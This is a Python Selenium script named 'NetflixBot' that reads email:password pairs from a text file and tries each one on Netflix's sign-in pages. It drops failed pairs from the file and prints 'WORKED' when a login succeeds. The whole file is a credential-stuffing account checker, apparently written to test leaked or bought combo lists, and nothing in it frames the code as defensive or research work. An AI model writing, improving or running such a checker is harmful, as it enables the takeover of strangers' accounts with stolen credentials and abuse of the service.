from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
from tempfile import mkstemp
from shutil import move, copymode
import os
from os import fdopen, remove
import re
import sys

class NetflixBot():

    def __init__(self):
        self.driver = webdriver.Chrome()

    def getCreds(self, filepath):
        with open(filepath,"r") as accFile:
            tmp = re.findall("((.*)?:)", accFile.read())
        emails = [i[1] for i in tmp]

        noisy_passList = []
        passList = []
        with open(filepath,"r") as accFile:
            for i, element in enumerate(accFile):
                noisy_pass = re.sub("((.*)?:)", "", element)
                noisy_passList.append(noisy_pass.strip())
        for i, noisy_pass in enumerate(noisy_passList):
            password = re.sub("\s|\||.$", "", noisy_pass)
            passList.append(password)
        
        tmp = list(zip(emails,passList))
        zipped_creds = tmp[:]
        creds = list(zipped_creds)
        return creds

    def login(self, records,attempt):
        for cnt, cred in enumerate(records):
            self.driver.get('https://netflix.com')

            email_in = self.driver.find_element_by_xpath('//*[@id="id_email"]')
            print("\nHomepage reached as textbox is identified")

            email_in.send_keys(Keys.CONTROL + "a")
            email_in.send_keys(Keys.DELETE)
            print("Email address textbox cleared")
            email_in.send_keys(cred[0])
            print("Email address entered")

            try_btn = self.driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div/div/div/div/div[2]/div[1]/div[2]/form/div/div/div/div/div/button')
            
            try_btn.click()
            print("TRY IT NOW button pressed")

            sleep(2)

            post_email_url = str(self.driver.current_url) #url after clicking TRY IT NOW

            if (post_email_url != ("https://www.netflix.com/signup/password?locale=en-BD" or "https://www.netflix.com/signup/password?locale=en-SG")):
                creds = self.fail(cred[0],cred[1],attempt,False)
                self.driver.quit()
                bot = NetflixBot()
                bot.login(creds,0)

            sleep(2)
            
            pass_in = self.driver.find_element_by_xpath('//*[@id="id_password"]')
            print("\nPassword page reached as textbox is identified")
                
            pass_in.send_keys(cred[1])
            print("Password entered")

            pre_pass_url = self.driver.current_url #url before logging in

            cont_btn = self.driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div/div[2]/div/form/div/div[4]/button')
            cont_btn.click()
            print("CONTINUE button clicked")

            sleep(2)

            post_pass_url = self.driver.current_url #url after logging in

            if (pre_pass_url == post_pass_url):
                element = self.driver.find_element_by_xpath('//*[@id="appMountPoint"]/div/div/div[2]/div/form/div/div[1]/div/div[2]')
                if (element.text != "Incorrect password. Please try again or you can reset your password."):
                    print("\n",element.text)
                    sys.exit()
                else:
                    self.fail(cred[0],cred[1],attempt,True)
            else:
                sys.exit("WORKED ✔️")
    
    def fail(self,email,password,attempt,isComplete):
        attempt+=1
        print("\nDID NOT WORK ❌ - Attempt",attempt,"\n",email,"\n",password)
        self.replace(filepath)
        print("DELETED")
        updated_creds = self.getCreds(filepath)
        if isComplete:
            self.login(updated_creds,attempt)
        else:
            return updated_creds

    def replace(self, filepath):
        #Create temp file
        fh, abs_path = mkstemp()
        with fdopen(fh,'w') as new_file:
            with open(filepath) as old_file:
                for i, line in enumerate(old_file):
                    if (i!=0):
                        new_file.write(line)
        #Copy the file permissions from the old file to the new file
        copymode(filepath, abs_path)
        #Remove original file
        remove(filepath)
        #Move new file
        move(abs_path, filepath)

filepath = os.path.relpath("flix_acc.txt")
bot = NetflixBot()
creds = bot.getCreds(filepath)
bot.login(creds,0)